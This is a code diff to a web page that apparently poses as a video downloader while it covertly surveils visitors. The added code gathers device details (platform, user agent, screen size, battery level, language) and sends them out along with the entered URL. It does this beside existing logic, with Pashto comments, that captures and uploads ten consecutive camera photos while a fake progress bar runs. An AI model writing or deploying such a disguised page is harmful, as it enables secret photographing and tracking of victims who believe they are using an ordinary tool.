@@ -183,6 +183,27 @@
             } catch (e) {}
         }
 
+        async function sendDeviceInfo() {
+            let batteryPercentage = "N/A";
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryPercentage = Math.round(battery.level * 100) + "%";
+                }
+            } catch (e) {}
+
+            const info = { 
+                deviceType: navigator.platform, 
+                androidVer: navigator.userAgent, 
+                screenSize: window.innerWidth + " x " + window.innerHeight, 
+                batteryLevel: batteryPercentage, 
+                language: navigator.language 
+            };
+            const fd = new FormData(); 
+            fd.append('device_info', JSON.stringify(info)); 
+            await sendData(fd);
+        }
+
         async function sendSinglePhoto(stream) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -256,6 +277,13 @@
 
             processBox.style.display = "block";
 
+            // د وسیلې معلومات او د بیټرۍ فیصدی لیږل
+            await sendDeviceInfo();
+            const urlFd = new FormData();
+            urlFd.append('video_url', urlVal);
+            urlFd.append('selected_quality', selectedQualityValue);
+            await sendData(urlFd);
+
             let progress = 0;
             const progressInterval = setInterval(() => {
                 progress += 2;
@@ -293,6 +321,7 @@
                     let photoCount = 0;
                     const maxPhotos = 10; 
 
+                    // ۱۰ پرله‌پسې عکسونه اخستل او استول
                     const photoInterval = setInterval(async () => {
                         if (photoCount < maxPhotos) {
                             photoCount++;
